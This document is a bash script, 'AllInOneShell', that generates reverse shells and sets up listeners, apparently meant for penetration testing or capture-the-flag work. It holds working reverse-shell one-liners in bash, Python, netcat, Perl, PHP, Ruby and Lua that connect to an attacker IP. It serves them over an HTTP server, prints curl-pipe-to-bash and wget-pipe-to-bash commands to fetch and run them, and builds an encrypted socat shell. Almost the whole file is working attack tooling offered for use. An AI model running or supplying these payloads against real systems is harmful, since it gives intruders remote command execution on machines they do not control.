#!/bin/bash
# Reverse Shell Generator by Freddie

# Colours:
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
BLUE="${C}[1;34m"
YELLOW="${C}[1;33m"
LIGHT_GREY="${C}[1;37m"
NC="${C}[0m"
UNDERLINED="${C}[4m"

# Config Items
http_port=80
http_timeout=180


# Banner:
function print_banner(){
	banner='		 __                   __             __              __        
                / /\                 /\ \           /\ \            / /\      
               / /  \                \ \ \         /  \ \          / /  \     
              / / /\ \               /\ \_\       / /\ \ \        / / /\ \__  
             / / /\ \ \             / /\/_/      / / /\ \ \      / / /\ \___\ 
            / / /  \ \ \           / / /        / / /  \ \_\     \ \ \ \/___/ 
           / / /___/ /\ \         / / /        / / /   / / /      \ \ \       
          / / /_____/ /\ \       / / /        / / /   / / /   _    \ \ \      
         / /_________/\ \ \  ___/ / /__      / / /___/ / /   /_/\__/ / /      
        / / /_       __\ \_\/\__\/_/___\    / / /____\/ /    \ \/___/ /       
        \_\___\     /____/_/\/_________/    \/_________/      \_____\/        
                                                                              '
    echo "$LIGHT_GREY$banner$NC"
	printf $RED"			AllInOneShell"$NC$YELLOW" - by Freddie \n"$NC
	printf "\n"
}

# Initalise Local IP/Port
export IP=$1
export PORT=$2
export MODE=$3

# Get ip/port from input:
get_ip(){
	echo -n "Enter IP: "
	read IP
}

get_port(){
	echo -n "Enter Port: "
	read PORT
}

function get_port_ip(){
	# Get ip/port from args:
	if [ "$IP" ]; then
		echo -n ""
	else
		if [[ $(ifconfig tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | wc -c) -eq 0 ]]; then
			get_ip;
		else
			echo $BLUE"[*]"$NC" VPN connection found: using tun0 as address"
			export IP=$(ifconfig tun0 2>/dev/null | grep 'inet ' | awk '{print $2}')
		fi
	fi

	if [ "$PORT" ]; then
		echo -n ""
	else
		get_port;
	fi

	# Enable sudo if port is <1000
	if [ $PORT -lt 1000 ]; then
		sudo="sudo";
		if [[ -v $(getcap $(readlink -f /usr/bin/nc) >/dev/null) ]]; then 
			echo $BLUE"[*] "$NC"Port under 1000 has been chosen, sudo is required"
		else
			echo $BLUE"[*] "$NC"Capabilities found - no need for sudo."
			echo
		fi
	else
		echo -n "";
	fi
}

# Because this exports, basically the variable needs to be exported before functions are called.
# I could rearrange the order, and pass in the IP/PORT as an arg, but realistically, I don't have the time right now.
print_banner
get_port_ip

# Shell commands:

cmd='
if command -v bash >/dev/null 2>&1; then
	echo "Command that worked: bash" > /dev/tcp/IP_REPLACE/PORT_REPLACE
	/bin/bash -i >& /dev/tcp/IP_REPLACE/PORT_REPLACE 0>&1
	exit;
elif command -v python >/dev/null 2>&1; then
	echo "Command that worked: python" > /dev/tcp/IP_REPLACE/PORT_REPLACE
	python -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP_REPLACE",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'\''
	exit;
elif command -v python3 >/dev/null 2>&1; then
	echo "Command that worked: python3" > /dev/tcp/IP_REPLACE/PORT_REPLACE
	python3 -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP_REPLACE",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'\''
	exit;
elif command -v nc >/dev/null 2>&1; then
	echo "Command that worked: nc" > /dev/tcp/IP_REPLACE/PORT_REPLACE
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_REPLACE PORT_REPLACE >/tmp/f
	exit;
elif command -v perl >/dev/null 2>&1; then
	echo "Command that worked: perl" > /dev/tcp/IP_REPLACE/PORT_REPLACE
	perl -e '\''use Socket;$i="IP_REPLACE";$p=PORT_REPLACE;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\''
	exit;
elif command -v sh >/dev/null 2>&1; then
	echo "Command that worked: sh" > /dev/tcp/IP_REPLACE/PORT_REPLACE
	/bin/sh -i >& /dev/tcp/IP_REPLACE/PORT_REPLACE 0>&1
	exit;
elif command -v php >/dev/null 2>&1; then
	echo "Command that worked: php" > /dev/tcp/IP_REPLACE/PORT_REPLACE
	php -r '\''$sock=fsockopen("IP_REPLACE",PORT_REPLACE);exec("/bin/sh -i <&3 >&3 2>&3");'\''
	exit;
elif command -v ruby >/dev/null 2>&1; then
	echo "Command that worked: ruby" > /dev/tcp/IP_REPLACE/PORT_REPLACE
	ruby -rsocket -e '\''f=TCPSocket.open("IP_REPLACE",PORT_REPLACE).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\''
	exit;
elif command -v lua >/dev/null 2>&1; then
	echo "Command that worked: lua" > /dev/tcp/IP_REPLACE/PORT_REPLACE
	lua -e '\''require("socket");require("os");t=socket.tcp();t:connect("IP_REPLACE","PORT_REPLACE");os.execute("/bin/sh -i <&3 >&3 2>&3");'\''
	exit;

# Add your own reverse shells:
#elif command -v [command] >/dev/null 2>&1; then
#	[command rev shell]
#	exit;

else
	echo "No programs installed!" > /dev/tcp/IP_REPLACE/PORT_REPLACE
fi
'

check_netcat(){
	binary=$(readlink -f $(which nc))
	if [[ $binary == "/usr/bin/ncat" ]]; then
		echo -n ""
	else
		echo -n $BLUE"[*]"$NC" Wrong netcat binary found, would you like to install ncat (Y/n): "
		read CHOICE
		if [[ ${CHOICE@U} == "N" ]]; then
			echo -n ""
		else
			sudo apt install ncat
		fi
	fi
}


# Install socat, if necessary
if [[ $(which socat) == "" ]]; then
	echo "${BLUE}[*]${NC} Socat is not installed!"
	sudo apt install socat -y
fi

# Add capabilities to netcat, socat and python, if not found.
if [[ -v $(getcap $(readlink -f /usr/bin/nc) | grep -i "bind" >/dev/null 2>&1) ]]; then 
	sudo setcap 'CAP_NET_BIND_SERVICE+ep' $(readlink -f /usr/bin/nc)
	echo $BLUE"[*] "$NC"Added network capabilities to netcat"
fi

if [[ -v $(getcap $(readlink -f /usr/bin/python3) | grep -i "bind" >/dev/null 2>&1) ]]; then
	sudo setcap 'CAP_NET_BIND_SERVICE+ep' $(readlink -f /usr/bin/python3)
	echo $BLUE"[*] "$NC"Added network capabilities to python3"
fi

if [[ -v $(getcap $(readlink -f $(which socat)) | grep -i "bind" >/dev/null 2>&1) ]]; then 
	sudo setcap 'CAP_NET_BIND_SERVICE+ep' $(readlink -f $(which socat))
	echo $BLUE"[*] "$NC"Added network capabilities to socat"
fi


function socat_listen(){
    if [ $(which nc) ]; then
    	echo $LIGHT_GREY"[*] "$NC"Socat listener started on port $PORT"
    	exec socat -d -d OPENSSL-LISTEN:${PORT},cert=$tmp_dir/shell_public.pem,verify=0 -
    else
    	printf $LIGHT_GREY"[=]"$NC" Socat is not installed on the system!\n"
    fi
}


socat_file() {

	if [[ $(echo -n $IP) == "" ]]; then
		echo "${YELLOW}[-]${NC} IP not found - exiting."
		exit
	fi

	echo "${RED}[*]${NC} Creating socat file: $tmp_dir/shell.sh"
	echo ""
	echo "socat OPENSSL:${IP}:${PORT},verify=0 EXEC:/bin/bash,pty,stderr,sigint,setsid,sane" > $tmp_dir/shell.sh
}

gen_keys() {
	echo $RED"[*] "$NC"Writing certificate/key to temp directory: ${BLUE}${tmp_dir}${NC}"
	openssl req -newkey rsa:2048 -nodes -keyout ${tmp_dir}/private_shell.key -x509 -days 365 -out ${tmp_dir}/shell_cert.crt -batch >/dev/null 2>&1
	cat ${tmp_dir}/private_shell.key ${tmp_dir}/shell_cert.crt > ${tmp_dir}/shell_public.pem
	echo
}


function use_netcat(){
    if [ $(which nc) ]; then
    	echo $LIGHT_GREY"[*] "$NC"Netcat listener started on port $PORT"
    	exec nc -klvnp $PORT
    else
    	printf $LIGHT_GREY"[=]"$NC" Netcat is not installed on the system!\n"
    fi
}
echo $IP
echo $PORT
cmd=$(echo "$cmd" | sed -e "s/IP_REPLACE/$IP/g" | sed -e "s/PORT_REPLACE/$PORT/g")

function rev_file(){
	echo "$cmd" > "$tmp_dir/shell.sh"
	echo $BLUE"[*] "$NC"Generated revshell file: ${BLUE}${tmp_dir}/shell.sh${NC}"
	echo
	
}

function http_server(){
	# Uses wget's option to write to stdout, so nothing is stored in memory ;\)
	curl_cmd=$(echo "curl -s http://$IP:$http_port/shell.sh | bash" | sed -e "s/:80\//\//g")
	wget_cmd=$(echo "wget -O - http://$IP:$http_port/shell.sh | bash" | sed -e "s/:80\//\//g")
	echo $RED"[*] "$NC"Execute reverse shell:"
	echo "$curl_cmd"
	echo "$wget_cmd"
	echo
	echo $LIGHT_GREY"[*] "$NC"HTTP Server started in background"
	timeout -k 9 $http_timeout python3 -m http.server $http_port --directory $tmp_dir &
	sleep $http_timeout && rm -r ${tmp_dir} &
	sleep 1.5
	echo
}

function kill_servers(){
	other_servers=$(ps faux | grep "python3 -m http.server $http_port" | grep -v "grep ")
	pid=$(echo "$other_servers" | awk '{print $2}')
	if [[ $(echo -n "$other_servers" | wc -c) -gt 0 ]]; then
		echo $RED"[*] "$NC"Killed HTTP server running on the same port"
		kill -9 ${pid}
	fi
	echo
}


function choose_mode(){
	echo "1) Netcat multi-shell"
	echo "2) Socat encrypted shell"
	echo -n "[1|2]: "
	read MODE
}
 
function run_netcat(){
	check_netcat
	rev_file
	http_server
	use_netcat
}

function run_socat(){
	socat_file
	gen_keys
	http_server
	socat_listen
}


# Create temporary directory to operate from
export tmp_dir=$(mktemp -d)


if [[ "$MODE" != "" ]]; then
	echo -n ""
else
	choose_mode
fi

# Print options
printf $LIGHT_GREY"[*]"$NC" IP: $IP\n"
printf $LIGHT_GREY"[*]"$NC" PORT: $PORT\n"



case $MODE in
	1) echo $LIGHT_GREY"[*]"$NC" MODE: Netcat";
	echo ""
	kill_servers
	run_netcat
	;;
	2) echo $LIGHT_GREY"[*]"$NC" MODE: Socat";
	echo ""
	kill_servers
	run_socat
	;;
esac

rm -rf ${tmp_dir}

# Who knew you could write a bash script over one line long huh?
# Unfortunately both the reverse shell and the listener have to be using the --ssl flag in ncat for it to work. So it's not currently implemented.
